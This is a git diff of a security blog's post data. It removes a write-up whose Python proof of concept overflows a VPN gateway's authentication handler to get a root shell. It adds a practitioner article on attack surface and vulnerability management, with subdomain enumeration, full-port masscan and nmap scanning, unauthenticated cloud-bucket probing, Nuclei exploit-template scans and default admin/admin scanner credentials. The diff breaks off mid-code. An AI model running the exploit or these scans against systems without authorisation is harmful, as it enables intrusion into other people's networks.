@@ -13615,96 +13615,882 @@ svc_backup   : Backup@123`
     ]
   },
   {
-    id: "cve-2024-vpn",
-    category: "CVE RESEARCH",
-    categoryColor: "oklch(0.82 0.18 65)",
-    categoryBg: "oklch(0.82 0.18 65 / 0.1)",
-    categoryBorder: "oklch(0.82 0.18 65 / 0.3)",
-    title: "CVE-2024-XXXX: RCE in Popular VPN Gateway",
-    excerpt: "Documenting the discovery of a stack-based buffer overflow in a widely deployed enterprise VPN appliance. The vulnerability allows unauthenticated remote code execution via a malformed authentication packet. Full responsible disclosure timeline included.",
-    date: "Jan 2025",
-    readTime: "18 min read",
+    id: "attack-surface-vulnerability-management-2025",
+    category: "SECURITY ENGINEERING",
+    categoryColor: "oklch(0.65 0.22 145)",
+    categoryBg: "oklch(0.65 0.22 145 / 0.1)",
+    categoryBorder: "oklch(0.65 0.22 145 / 0.3)",
+    title: "Attack Surface Management & Vulnerability Management: A Practitioner's Deep Dive",
+    excerpt:
+      "A comprehensive breakdown of how modern security teams identify, track, and eliminate weaknesses across their digital estate. Covering ASM methodology, vulnerability lifecycle, tooling, and real-world command-line workflows — the way practitioners actually do it.",
+    date: "May 2025",
+    readTime: "28 min read",
+    coverImage: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1200&auto=format&fit=crop&q=80",
+    tags: ["ASM", "Vulnerability Management", "Red Team", "Recon", "Nmap", "Nuclei", "CVSS"],
     sections: [
       {
+        heading: "Introduction: Why Your Perimeter Is Already Gone",
         paragraphs: [
-          "During a routine security assessment for a financial sector client, I identified a stack-based buffer overflow vulnerability in a popular enterprise VPN gateway's authentication handler. The affected endpoint processed user-supplied input without proper length validation before copying it into a fixed-size stack buffer. With over 40,000 internet-exposed instances, the impact radius was significant."
-        ]
-      },
-      {
-        heading: "Vulnerability Analysis",
-        paragraphs: [
-          "Fuzzing the /api/auth endpoint with progressively larger payloads revealed the crash at a username field length of 600 bytes. A cyclic pattern confirmed RIP control at offset 512. The binary was compiled without stack canaries and without PIE, making exploitation deterministic:"
+          "Let's be honest — the traditional idea of a 'perimeter' is dead. Five years ago, a security team could draw a box around their corporate network, monitor what crossed the boundary, and call it a day. Today, that same organisation might have developers spinning up AWS Lambda functions at midnight, a marketing team using five different SaaS tools, and three acquisitions running on completely separate infrastructure stacks that nobody fully documented. The attack surface has exploded, and most security teams are still trying to defend with yesterday's mindset.",
+          "Attack Surface Management (ASM) and Vulnerability Management (VM) are two disciplines that have evolved rapidly to address this reality. They're often lumped together in vendor marketing, but they're genuinely different — and understanding where one ends and the other begins is critical if you want to build a program that actually works rather than just looks good in a quarterly report.",
+          "This writeup is a practitioner's guide. I'm going to cover the theory where it matters, but mostly I want to walk through real workflows — the kind that show up in actual red team engagements and internal security programs. You'll see real tool outputs, real commands, and the messy thinking that happens when you're trying to figure out what your organisation actually looks like from an attacker's perspective.",
         ],
-        codeBlock: {
-          language: "http",
-          code: `POST /api/auth HTTP/1.1
-Host: vpn.corp.local
-Content-Type: application/x-www-form-urlencoded
-
-username=AAAAAAAAAA[x600]&password=test
-
-# Response:
-# HTTP/1.1 500 Internal Server Error
-# Segmentation fault (core dumped)
-# RIP = 0x6161616161616161  <-- controlled by attacker`
+        image: {
+          url: "https://images.unsplash.com/photo-1510511459019-5dda7724fd87?w=1100&auto=format&fit=crop&q=80",
+          caption:
+            "Modern attack surfaces span cloud, on-prem, SaaS, and shadow IT — far beyond what traditional perimeter models anticipated.",
+          alt: "Server room with network cables representing complex attack surfaces",
         },
-        imagePlaceholder: {
-          caption: "fig 1: GDB output — RIP overwrite at offset 512",
-          src: "/assets/generated/gdb-rip-overwrite.dim_800x400.png"
-        }
       },
       {
-        heading: "Exploitation",
+        heading: "Part 1 — Attack Surface Management",
+        paragraphs: [],
+      },
+      {
+        heading: "What Is ASM, Really?",
         paragraphs: [
-          "The proof-of-concept uses a classic ret2libc chain. No ASLR bypass was required since PIE was disabled and the binary's base address was static. A single unauthenticated HTTP request yields a root shell:"
+          "Attack Surface Management is the continuous process of discovering, inventorying, classifying, and monitoring all internet-facing assets that belong to an organisation. The keyword is 'continuous' — ASM isn't a scan you run before a pentest and forget about. It's an ongoing program that mirrors what attackers do: constantly probing, searching, and mapping.",
+          "Think about how a threat actor actually starts an operation. They don't have your internal network diagrams. They start from what's publicly visible: DNS records, certificate transparency logs, WHOIS data, ASN routing tables, GitHub repositories, job postings (which inadvertently reveal technology stacks), and passive data from services like Shodan and Censys. Good ASM mimics exactly this methodology. The goal is to find your assets before attackers do — and find the ones your own team has forgotten about.",
+          "There are three flavours of attack surface that ASM programs need to account for. First is the known attack surface — assets your IT and security teams are actively tracking. Second is the unknown attack surface — assets that exist but aren't in your CMDB or inventory. This includes shadow IT, forgotten dev environments, and assets inherited from acquisitions. Third is the third-party or supply chain attack surface — systems operated by vendors, partners, and service providers that have trust relationships with your environment. All three matter, and most programs only have solid coverage of the first.",
         ],
-        codeBlock: {
-          language: "python",
-          code: `#!/usr/bin/env python3
-# CVE-2024-XXXX PoC - Stack Buffer Overflow
-import socket, struct
-
-target = ("vpn.corp.local", 443)
-padding = b"A" * 512
-ret_addr = struct.pack("<Q", 0x7f8b3c2a1d40)  # system@libc
-rop_chain = padding + ret_addr + b"/bin/sh\0"
-
-s = socket.create_connection(target)
-http_req = (
-    b"POST /api/auth HTTP/1.1\r
-"
-    b"Host: vpn.corp.local\r
-"
-    b"Content-Type: application/x-www-form-urlencoded\r
-"
-    b"Content-Length: " + str(len(rop_chain)).encode() + b"\r
-\r
-"
-    + rop_chain
-)
-s.send(http_req)
-print("[+] Payload sent. Check listener.")`
-        }
       },
       {
-        heading: "Disclosure Timeline",
-        list: [
-          "Nov 15, 2024 — Vulnerability discovered during client engagement",
-          "Nov 16, 2024 — PoC developed and validated in isolated lab",
-          "Nov 20, 2024 — Initial disclosure to vendor PSIRT",
-          "Nov 22, 2024 — Vendor acknowledged and opened tracking ticket",
-          "Dec 10, 2024 — Vendor confirmed vulnerability, patch in development",
-          "Jan 08, 2025 — Patch released: firmware version 9.4.1",
-          "Jan 15, 2025 — CVE assigned and public advisory published"
-        ]
-      },
-      {
-        heading: "Mitigation",
+        heading: "Phase 1: Asset Discovery — Finding What You Own",
         paragraphs: [
-          "Update to firmware version 9.4.1 or later immediately. Organizations unable to patch should restrict VPN management interface access to trusted IP ranges via firewall ACLs, and enable IDS/IPS rules to detect oversized authentication payloads. Network monitoring for unexpected outbound connections from the VPN appliance is also recommended as an interim detection measure."
-        ]
+          "Discovery is the foundation. If you don't know an asset exists, you can't protect it. The methodology here borrows heavily from OSINT and external reconnaissance techniques used in offensive security.",
+          "Start with the organisation's seed data: known domain names, IP ranges, company names, and subsidiary names. From these seeds, you expand outward using a technique called pivoting — each discovered asset reveals new data that points to more assets.",
+        ],
+        code: {
+          language: "bash",
+          label: "Subdomain Enumeration with Subfinder + Passive DNS",
+          snippet: `# Install subfinder
+  go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+   
+  # Basic subdomain enumeration with API keys configured
+  subfinder -d target.com -all -recursive -o subdomains.txt
+   
+  # Use multiple passive sources explicitly
+  subfinder -d target.com -sources shodan,censys,fofa,github,virustotal -o subdomains_passive.txt
+   
+  # Combine with amass for broader coverage
+  amass enum -passive -d target.com -o amass_output.txt
+   
+  # Merge and deduplicate results
+  cat subdomains.txt amass_output.txt | sort -u | anew all_subdomains.txt
+   
+  # Quick stats
+  wc -l all_subdomains.txt`,
+        },
+      },
+      {
+        paragraphs: [
+          "Certificate transparency logs are one of the most underrated sources for asset discovery. Every time an organisation requests a TLS certificate — even for an internal staging server — that certificate request gets logged in public CT logs. Tools like crt.sh expose this beautifully.",
+        ],
+        code: {
+          language: "bash",
+          label: "Certificate Transparency Log Mining",
+          snippet: `# Query crt.sh for a domain
+  curl -s "https://crt.sh/?q=%.target.com&output=json" | \\
+    jq -r '.[].name_value' | \\
+    sed 's/\\*\\.//g' | \\
+    sort -u | \\
+    grep -v "^\\." > ct_subdomains.txt
+   
+  # Python alternative for cleaner parsing
+  python3 -c "
+  import requests, json
+  r = requests.get('https://crt.sh/?q=%.target.com&output=json')
+  domains = set()
+  for entry in r.json():
+      for d in entry['name_value'].split('\\n'):
+          domains.add(d.replace('*.','').strip())
+  for d in sorted(domains):
+      print(d)
+  " > ct_results.txt
+   
+  # Cross-reference with your known assets
+  comm -23 <(sort ct_results.txt) <(sort known_assets.txt) > unknown_ct_assets.txt`,
+        },
+      },
+      {
+        paragraphs: [
+          "DNS enumeration goes deeper than passive sources. Active DNS brute-forcing combined with DNS zone walking (when NSEC records are present) and reverse DNS lookups on IP ranges rounds out the picture significantly.",
+        ],
+        code: {
+          language: "bash",
+          label: "Active DNS Enumeration with PureDNS",
+          snippet: `# Install puredns
+  go install github.com/d3mondev/puredns/v2@latest
+   
+  # Brute-force subdomains with a wordlist
+  puredns bruteforce ~/wordlists/dns/best-dns-wordlist.txt target.com \\
+    -r ~/resolvers/valid-resolvers.txt \\
+    -w dns_bruteforce.txt
+   
+  # Resolve all collected subdomains to verify they're live
+  puredns resolve all_subdomains.txt \\
+    -r ~/resolvers/valid-resolvers.txt \\
+    -w resolved_subdomains.txt
+   
+  # Extract just the IPs for further analysis
+  cat resolved_subdomains.txt | awk '{print $2}' | sort -u > discovered_ips.txt
+   
+  # Reverse DNS on a CIDR range to find uncatalogued assets  
+  prips 203.0.113.0/24 | xargs -I{} dig -x {} +short 2>/dev/null | grep target.com`,
+        },
+      },
+      {
+        heading: "Phase 2: Asset Fingerprinting and Technology Detection",
+        paragraphs: [
+          "Raw subdomains and IP addresses are just a list. To turn that list into actionable intelligence, you need to fingerprint each asset — understanding what technologies are running, what services are exposed, what HTTP status they return, and what their attack profile looks like.",
+          "HTTPX from Project Discovery is the go-to tool here. It can take thousands of subdomains and rapidly determine which ones are serving HTTP/HTTPS, extract title tags, detect web server headers, identify technologies, and screen capture pages for visual review.",
+        ],
+        code: {
+          language: "bash",
+          label: "Mass HTTP Probing and Technology Fingerprinting with HTTPX",
+          snippet: `# Install httpx
+  go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+   
+  # Probe all resolved subdomains for live web services
+  cat resolved_subdomains.txt | httpx \\
+    -title \\
+    -tech-detect \\
+    -status-code \\
+    -content-length \\
+    -web-server \\
+    -follow-redirects \\
+    -threads 50 \\
+    -timeout 10 \\
+    -o httpx_results.json \\
+    -json
+   
+  # Extract interesting findings - admin panels, login pages
+  cat httpx_results.json | jq -r 'select(.title | test("admin|login|dashboard|portal|console|manage"; "i")) | .url'
+   
+  # Find assets running specific technologies
+  cat httpx_results.json | jq -r 'select(.tech != null) | select(.tech[] | test("WordPress|Jira|Confluence|Jenkins|GitLab"; "i")) | .url'
+   
+  # Find non-standard ports
+  cat httpx_results.json | jq -r 'select(.port != 80 and .port != 443) | "\(.url) - Port: \(.port)"'
+   
+  # Visual screenshot of all live assets (helps for manual review)
+  cat resolved_subdomains.txt | httpx -screenshot -o screenshots/`,
+        },
+      },
+      {
+        paragraphs: [
+          "Shodan and Censys deserve a dedicated workflow. These search engines index the entire internet continuously, meaning they often have data on your assets that's days or weeks old but doesn't require you to actively probe anything. This is gold for ASM — you can discover what attackers already see about you without making any noise.",
+        ],
+        code: {
+          language: "bash",
+          label: "Shodan & Censys Queries for ASM",
+          snippet: `# Shodan CLI setup
+  pip install shodan
+  shodan init YOUR_API_KEY
+   
+  # Search for all assets belonging to an organisation
+  shodan search 'org:"Target Corporation"' --fields ip_str,port,hostnames,product > shodan_org_results.csv
+   
+  # Find exposed admin interfaces
+  shodan search 'org:"Target Corporation" http.title:"Admin"' --fields ip_str,port,http.title
+   
+  # Find specific technologies (e.g., exposed Jenkins)
+  shodan search 'org:"Target Corporation" product:"Jenkins"'
+   
+  # Search by ASN
+  shodan search 'asn:AS12345' --fields ip_str,port,hostnames,product
+   
+  # Censys using censys-python
+  pip install censys
+  python3 << 'EOF'
+  from censys.search import CensysHosts
+   
+  h = CensysHosts()
+  # Search for certificates issued to your domain
+  query = "parsed.names: target.com AND services.port: 443"
+  for host in h.search(query, per_page=100):
+      print(f"{host['ip']} - {host.get('services', [])}")
+  EOF
+   
+  # FOFA query (if you have access)
+  # Search: domain="target.com" || cert="target.com"`,
+        },
+      },
+      {
+        heading: "Phase 3: Exposure Analysis — What Can an Attacker Actually Do?",
+        paragraphs: [
+          "Discovery and fingerprinting tell you what exists. Exposure analysis tells you how dangerous it is. This is where ASM transitions from inventory management into something with real security teeth.",
+          "Port scanning is the obvious starting point, but there's a right way and a wrong way to do it at scale. Running a full Nmap scan against thousands of hosts will take forever and may trigger network defences. The better approach is to use a fast scanner like Masscan to identify open ports first, then hand those results to Nmap for service detection and script scanning on confirmed open ports.",
+        ],
+        code: {
+          language: "bash",
+          label: "Efficient Large-Scale Port Scanning with Masscan + Nmap",
+          snippet: `# Phase 1: Fast port discovery with Masscan (rate-limited to avoid disruption)
+  sudo masscan -iL discovered_ips.txt \\
+    -p 0-65535 \\
+    --rate 1000 \\
+    --output-format json \\
+    --output-filename masscan_results.json
+   
+  # Parse masscan results to extract IP:port pairs
+  python3 -c "
+  import json
+  with open('masscan_results.json') as f:
+      data = json.load(f)
+  for host in data:
+      ip = host['ip']
+      for port in host['ports']:
+          print(f'{ip}:{port[\"port\"]}')
+  " > open_ports.txt
+   
+  # Phase 2: Targeted Nmap service detection on open ports only
+  # Group by IP for efficient scanning
+  awk -F: '{print $1}' open_ports.txt | sort -u > live_ips.txt
+   
+  nmap -sV -sC --version-intensity 5 \\
+    -iL live_ips.txt \\
+    --open \\
+    -oA nmap_service_scan \\
+    --script=banner,http-headers,ssl-cert,ssl-enum-ciphers \\
+    -T4
+   
+  # Find interesting services  
+  grep -E "ftp|telnet|rsh|rlogin|vnc|rdp|smb|ldap" nmap_service_scan.nmap
+   
+  # Find services with self-signed or expired certs
+  nmap -p 443,8443 --script ssl-cert -iL live_ips.txt | \\
+    grep -A5 "ssl-cert" | grep -E "expired|self-signed|commonName"`,
+        },
+      },
+      {
+        image: {
+          url: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1100&auto=format&fit=crop&q=80",
+          caption:
+            "Attack surface discovery involves layering multiple data sources — passive DNS, CT logs, Shodan, and active scanning — to build a complete picture of externally exposed assets.",
+          alt: "Matrix-style code visualization representing network reconnaissance",
+        },
+        paragraphs: [
+          "Cloud asset exposure deserves special attention. S3 buckets, Azure Blob containers, and GCP storage buckets are notoriously easy to misconfigure, and the consequences of public exposure can be catastrophic. Tools like CloudEnum and S3Scanner automate the discovery of misconfigured cloud storage.",
+        ],
+        code: {
+          language: "bash",
+          label: "Cloud Storage Misconfiguration Discovery",
+          snippet: `# S3 bucket enumeration for a target organisation
+  python3 cloud_enum.py -k targetcompany -k target-company -k targetcorp \\
+    --disable-azure --disable-gcp
+   
+  # Direct S3 bucket access testing
+  aws s3 ls s3://target-backup --no-sign-request
+  aws s3 ls s3://target-dev --no-sign-request
+  aws s3 ls s3://target-staging --no-sign-request
+   
+  # S3Scanner for bulk scanning
+  s3scanner --bucket-file bucket_names.txt --dump --out-file s3_results.txt
+   
+  # Check for public Azure blobs
+  python3 -c "
+  import requests
+  targets = ['targetcompany', 'target-company', 'targetbackup']
+  for name in targets:
+      url = f'https://{name}.blob.core.windows.net/?comp=list'
+      r = requests.get(url, timeout=5)
+      if r.status_code == 200:
+          print(f'[EXPOSED] {url}')
+      elif r.status_code == 403:
+          print(f'[EXISTS but private] {url}')
+  "
+   
+  # GCP bucket check
+  for bucket in target-backup target-data target-logs; do
+    gsutil ls gs://$bucket 2>/dev/null && echo "[EXPOSED] gs://$bucket"
+  done`,
+        },
+      },
+      {
+        heading: "Phase 4: Continuous Monitoring and Change Detection",
+        paragraphs: [
+          "One-time discovery is reconnaissance. Continuous discovery is ASM. The difference is that in a real ASM program, you're running these workflows on a schedule and diffing the results against previous runs to detect changes — new assets appearing, services changing, certificates expiring, or previously secured assets becoming exposed again.",
+          "Change detection is where ASM earns its keep. The most common scenario: a developer spins up a test environment on a Friday afternoon, exposes it to the internet, and forgets about it. Without continuous monitoring, that forgotten environment could be running with default credentials for weeks before anyone notices. With a well-tuned ASM workflow, you'd know about it Monday morning.",
+        ],
+        code: {
+          language: "bash",
+          label: "Automated Daily ASM Monitoring with Diff Detection",
+          snippet: `#!/bin/bash
+  # daily_asm_monitor.sh - Run this as a cron job
+   
+  DATE=$(date +%Y%m%d)
+  YESTERDAY=$(date -d "yesterday" +%Y%m%d)
+  OUTPUT_DIR="/opt/asm/results"
+  mkdir -p $OUTPUT_DIR/$DATE
+   
+  echo "[*] Starting daily ASM scan for $DATE"
+   
+  # Step 1: Subdomain enum
+  subfinder -d target.com -all -silent -o $OUTPUT_DIR/$DATE/subdomains.txt
+  puredns resolve $OUTPUT_DIR/$DATE/subdomains.txt \\
+    -r /opt/asm/resolvers.txt \\
+    -w $OUTPUT_DIR/$DATE/resolved.txt 2>/dev/null
+   
+  # Step 2: HTTP probing
+  httpx -l $OUTPUT_DIR/$DATE/resolved.txt \\
+    -title -status-code -tech-detect -json -silent \\
+    -o $OUTPUT_DIR/$DATE/httpx.json 2>/dev/null
+   
+  # Step 3: Diff against yesterday
+  if [ -d "$OUTPUT_DIR/$YESTERDAY" ]; then
+      echo "[*] Comparing with yesterday's results"
+      
+      # New subdomains
+      NEW_SUBS=$(comm -13 \\
+          <(sort $OUTPUT_DIR/$YESTERDAY/subdomains.txt 2>/dev/null) \\
+          <(sort $OUTPUT_DIR/$DATE/subdomains.txt))
+      
+      # Disappeared subdomains  
+      GONE_SUBS=$(comm -23 \\
+          <(sort $OUTPUT_DIR/$YESTERDAY/subdomains.txt 2>/dev/null) \\
+          <(sort $OUTPUT_DIR/$DATE/subdomains.txt))
+      
+      if [ -n "$NEW_SUBS" ]; then
+          echo "🚨 NEW ASSETS DETECTED:"
+          echo "$NEW_SUBS"
+          # Send alert via Slack webhook
+          curl -s -X POST $SLACK_WEBHOOK \\
+            -d "{\"text\":\"🚨 ASM Alert: New subdomains detected:\\n\`\`\`$NEW_SUBS\`\`\`\"}"
+      fi
+      
+      echo "$NEW_SUBS" >> /opt/asm/alerts/new_assets_$(date +%Y%m).log
+  fi
+   
+  echo "[✓] ASM scan complete. Results in $OUTPUT_DIR/$DATE"`,
+        },
+      },
+      {
+        heading: "ASM Tooling Landscape",
+        paragraphs: [
+          "The ASM tooling ecosystem has grown significantly. Here's how the major options break down, from open-source workflows to commercial platforms.",
+          "On the open-source side, Project Discovery's ecosystem is probably the most cohesive and actively maintained collection of ASM-adjacent tools available. Subfinder handles passive subdomain enumeration, HTTPX handles HTTP probing, Nuclei handles vulnerability detection, Katana handles web crawling, and Naabu handles port scanning. They're all written in Go, highly performant, and designed to pipe into each other. If you're building a custom ASM program from scratch, this stack is where I'd start.",
+          "Commercial platforms like Censys ASM, Axonius, Runzero, and Microsoft Defender EASM provide managed versions of these workflows with dashboards, integrations, and historical tracking. They're genuinely valuable for enterprise teams that don't have the bandwidth to maintain custom tooling, but they come with substantial per-asset pricing that can get expensive at scale. The trade-off is real: you pay for the operational overhead reduction.",
+        ],
+      },
+      {
+        heading: "Part 2 — Vulnerability Management",
+        paragraphs: [],
+      },
+      {
+        heading: "The Vulnerability Management Lifecycle",
+        paragraphs: [
+          "Vulnerability Management is what happens after you know what you have. Where ASM answers 'what is exposed?', VM answers 'what is broken?' — and then, critically, 'what do we fix first, and how?'",
+          "The VM lifecycle has five stages that most mature programs follow: Discover (which overlaps with ASM), Assess, Prioritise, Remediate, and Verify. The industry has gotten pretty good at the first two. The last three are where programs fall apart.",
+          "Here's the uncomfortable truth that most VM vendors won't tell you: the average enterprise has tens of thousands of open vulnerabilities at any given time. You will never fix all of them. The question isn't 'how do we fix everything?' — it's 'how do we fix the things that matter, fast enough to make a difference?' That reframe is the most important mental shift in modern VM.",
+        ],
+        image: {
+          url: "https://images.unsplash.com/photo-1551808525-51a94da548ce?w=1100&auto=format&fit=crop&q=80",
+          caption:
+            "The vulnerability management lifecycle: Discover → Assess → Prioritise → Remediate → Verify. Most programs are strong on the first two and weak on the last three.",
+          alt: "Circular lifecycle diagram representing vulnerability management stages",
+        },
+      },
+      {
+        heading: "Vulnerability Scanning: Getting the Raw Data",
+        paragraphs: [
+          "Vulnerability scanners are the engines of a VM program. They probe assets, compare what they find against a database of known vulnerabilities, and report what's potentially vulnerable. The two dominant open-source players are OpenVAS/Greenbone and Nuclei. On the commercial side, Tenable Nessus, Qualys VMDR, and Rapid7 InsightVM dominate the enterprise space.",
+          "Nuclei deserves particular attention because it's changed how a lot of practitioners think about vulnerability detection. Unlike traditional scanners that use version-based detection (check if software version X is less than Y, flag as vulnerable), Nuclei uses templates — small YAML-based definitions that encode the actual exploit proof-of-concept logic. This means Nuclei templates can detect vulnerabilities through active exploitation attempts, not just version strings, significantly reducing false positives.",
+        ],
+        code: {
+          language: "bash",
+          label: "Nuclei — Template-Based Vulnerability Scanning",
+          snippet: `# Install nuclei
+  go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+   
+  # Update templates to latest
+  nuclei -update-templates
+   
+  # Basic scan against a target list
+  nuclei -l httpx_results.txt -o nuclei_results.json -json
+   
+  # Scan with specific severity levels only (critical/high for triage)
+  nuclei -l targets.txt \\
+    -severity critical,high \\
+    -o nuclei_critical_high.json \\
+    -json \\
+    -stats
+   
+  # Scan for specific vulnerability categories
+  nuclei -l targets.txt \\
+    -tags cve,rce,sqli,xss,ssrf,lfi \\
+    -o nuclei_webapp.json \\
+    -json
+   
+  # Use only verified templates (lower false positive rate)
+  nuclei -l targets.txt \\
+    -tags cve \\
+    -template-filter "verified" \\
+    -o nuclei_verified.json
+   
+  # Scan for exposed panels and admin interfaces
+  nuclei -l targets.txt -tags panel,exposure -o panels.json -json
+   
+  # Scan for misconfigurations
+  nuclei -l targets.txt -tags misconfig -o misconfigs.json -json
+   
+  # Extract critical findings for immediate action
+  cat nuclei_results.json | jq -r 'select(.info.severity == "critical") | 
+    "[\(.info.severity | ascii_upcase)] \(.host) - \(.info.name)"'
+   
+  # Count findings by severity
+  cat nuclei_results.json | jq -r '.info.severity' | sort | uniq -c | sort -rn`,
+        },
+      },
+      {
+        paragraphs: [
+          "For network-level vulnerability scanning, Nessus remains the gold standard in most enterprise environments. For teams without budget for Nessus Professional, OpenVAS (now Greenbone Community Edition) is a fully functional alternative that many practitioners use for internal programs.",
+        ],
+        code: {
+          language: "bash",
+          label: "OpenVAS / Greenbone Vulnerability Scanning via CLI",
+          snippet: `# Start Greenbone/OpenVAS services (Kali Linux)
+  sudo gvm-setup
+  sudo gvm-start
+   
+  # Check services are running
+  sudo gvm-check-setup
+   
+  # Create a scan target via gvm-cli
+  gvm-cli socket --gmp-username admin --gmp-password admin \\
+    --xml "<create_target><name>Internal Network</name><hosts>10.0.0.0/24</hosts></create_target>"
+   
+  # List available scan configs
+  gvm-cli socket --gmp-username admin --gmp-password admin \\
+    --xml "<get_scan_configs/>" | xmllint --xpath "//scan_config/name/text()" -
+   
+  # Create and start a full scan
+  gvm-cli socket --gmp-username admin --gmp-password admin \\
+    --xml "<create_task>
+      <name>Weekly Internal Scan</name>
+      <config id='daba56c8-73ec-11df-a475-002264764cea'/>
+      <target id='TARGET_UUID_HERE'/>
+    </create_task>"
+   
+  # For Nessus CLI usage (nessusd must be running)
+  nessuscli scan new \\
+    --name "External ASM Scan" \\
+    --policy "Basic Network Scan" \\
+    --targets "targets.txt"
+   
+  # Export results to CSV
+  nessuscli report export SCAN_ID --format csv --output nessus_results.csv`,
+        },
+      },
+      {
+        heading: "Understanding CVSS: The Scoring System Everyone Misuses",
+        paragraphs: [
+          "The Common Vulnerability Scoring System (CVSS) is the industry-standard framework for rating the severity of vulnerabilities. Most people know it as 'the number next to the CVE'. But CVSS is widely misunderstood and, more importantly, widely misused as a prioritisation tool when it was never designed for that purpose.",
+          "CVSS v3.1 produces a Base Score between 0 and 10. This score is calculated from six metrics: Attack Vector (how the vulnerability is exploited — network, adjacent, local, physical), Attack Complexity (conditions required beyond attacker control), Privileges Required (what level of access the attacker needs), User Interaction (whether a victim must take an action), Scope (whether the vulnerability impacts resources beyond its security scope), and a combination of Confidentiality, Integrity, and Availability impact.",
+          "Here's the problem: CVSS Base Scores are calculated in a vacuum. They don't consider whether the vulnerability is actually exploitable in the wild, whether exploit code exists, whether the affected asset is internet-facing or air-gapped, or whether your specific configuration is actually vulnerable. A CVSS 9.8 vulnerability in software you don't run is less urgent than a CVSS 6.5 vulnerability in your customer-facing web application with a public exploit and active exploitation confirmed by CISA.",
+        ],
+        code: {
+          language: "python",
+          label: "CVSS v3.1 Score Breakdown — Understanding the Metrics",
+          snippet: `#!/usr/bin/env python3
+  """
+  CVSS v3.1 Vector String Parser and Scorer
+  Breaks down a CVSS vector into human-readable components
+  """
+   
+  import re
+   
+  CVSS_METRICS = {
+      "AV": {
+          "name": "Attack Vector",
+          "values": {
+              "N": ("Network", 0.85),
+              "A": ("Adjacent", 0.62),
+              "L": ("Local", 0.55),
+              "P": ("Physical", 0.20)
+          }
+      },
+      "AC": {
+          "name": "Attack Complexity",
+          "values": {
+              "L": ("Low", 0.77),
+              "H": ("High", 0.44)
+          }
+      },
+      "PR": {
+          "name": "Privileges Required",
+          "values": {
+              "N": ("None", 0.85),
+              "L": ("Low", 0.62),
+              "H": ("High", 0.27)
+          }
+      },
+      "UI": {
+          "name": "User Interaction",
+          "values": {
+              "N": ("None", 0.85),
+              "R": ("Required", 0.62)
+          }
+      },
+      "S": {
+          "name": "Scope",
+          "values": {
+              "U": ("Unchanged", None),
+              "C": ("Changed", None)
+          }
+      },
+      "C": {
+          "name": "Confidentiality Impact",
+          "values": {
+              "H": ("High", 0.56),
+              "L": ("Low", 0.22),
+              "N": ("None", 0.00)
+          }
+      },
+      "I": {
+          "name": "Integrity Impact",
+          "values": {
+              "H": ("High", 0.56),
+              "L": ("Low", 0.22),
+              "N": ("None", 0.00)
+          }
+      },
+      "A": {
+          "name": "Availability Impact",
+          "values": {
+              "H": ("High", 0.56),
+              "L": ("Low", 0.22),
+              "N": ("None", 0.00)
+          }
       }
-    ]
+  }
+   
+  def parse_cvss_vector(vector_string):
+      """Parse CVSS v3.1 vector string and display breakdown"""
+      # Example: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+      
+      vector_string = vector_string.replace("CVSS:3.1/", "")
+      metrics = dict(m.split(":") for m in vector_string.split("/"))
+      
+      print(f"\\n{'='*60}")
+      print(f"CVSS v3.1 Vector Analysis")
+      print(f"{'='*60}")
+      
+      for metric_code, value_code in metrics.items():
+          if metric_code in CVSS_METRICS:
+              metric = CVSS_METRICS[metric_code]
+              value_name = metric["values"][value_code][0]
+              print(f"  {metric['name']:<25} [{value_code}] {value_name}")
+      
+      return metrics
+   
+  def get_severity_label(score):
+      if score == 0.0:
+          return "NONE"
+      elif score < 4.0:
+          return "LOW"
+      elif score < 7.0:
+          return "MEDIUM"
+      elif score < 9.0:
+          return "HIGH"
+      else:
+          return "CRITICAL"
+   
+  # Example: Log4Shell (CVE-2021-44228)
+  vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+  parse_cvss_vector(vector)
+  print(f"\\n  Base Score: 10.0 — CRITICAL")
+  print(f"  Translation: Exploitable over network, no complexity,")
+  print(f"  no privileges, no user interaction, full CIA impact.")`,
+        },
+      },
+      {
+        heading: "Beyond CVSS: Risk-Based Vulnerability Prioritisation",
+        paragraphs: [
+          "The industry has evolved well beyond pure CVSS-based prioritisation. The frameworks that actually help security teams make good triage decisions layer additional context on top of the base score. The most important additions are exploit availability, threat intelligence on active exploitation, and asset context.",
+          "CISA's Known Exploited Vulnerabilities (KEV) catalogue is probably the single most useful prioritisation tool available to defenders today. It's a list of CVEs that CISA has confirmed are being actively exploited in the wild. If something is on the KEV list, that's your top tier — full stop. It doesn't matter if the CVSS score is 6.5; active exploitation in the wild means attackers have already figured out how to use it.",
+          "EPSS (Exploit Prediction Scoring System) takes a different approach — it uses machine learning trained on threat intelligence data to predict the probability that a given CVE will be exploited in the next 30 days. EPSS scores range from 0 to 1, and the distribution is heavily skewed: the vast majority of CVEs have EPSS scores under 0.01 (1% probability). An EPSS score above 0.1 (10%) should significantly elevate your prioritisation.",
+        ],
+        code: {
+          language: "bash",
+          label: "Building a Risk-Based Prioritisation Workflow",
+          snippet: `#!/bin/bash
+  # risk_prioritization.sh
+  # Combines CVSS, EPSS, and KEV data for intelligent vuln triage
+   
+  # Download CISA KEV catalogue
+  curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json \\
+    -o kev_catalogue.json
+   
+  # Extract just the CVE IDs for fast lookup
+  jq -r '.vulnerabilities[].cveID' kev_catalogue.json | sort > kev_cve_ids.txt
+   
+  echo "KEV catalogue contains $(wc -l < kev_cve_ids.txt) vulnerabilities"
+   
+  # For a list of CVEs from your scanner output, check against KEV
+  # scanner_cves.txt = one CVE per line from your Nessus/Nuclei output
+  while read cve; do
+      if grep -q "^${cve}$" kev_cve_ids.txt; then
+          echo "🔴 KEV MATCH — IMMEDIATE ACTION: $cve"
+      fi
+  done < scanner_cves.txt
+   
+  # Fetch EPSS scores for your CVE list via the FIRST API
+  python3 << 'EOF'
+  import requests
+  import json
+   
+  # Read your CVE list
+  with open('scanner_cves.txt') as f:
+      cves = [line.strip() for line in f if line.strip()]
+   
+  # Batch EPSS API calls (max 100 per request)
+  all_scores = []
+  for i in range(0, len(cves), 100):
+      batch = cves[i:i+100]
+      params = {"cve": ",".join(batch)}
+      r = requests.get("https://api.first.org/data/1.0/epss", params=params)
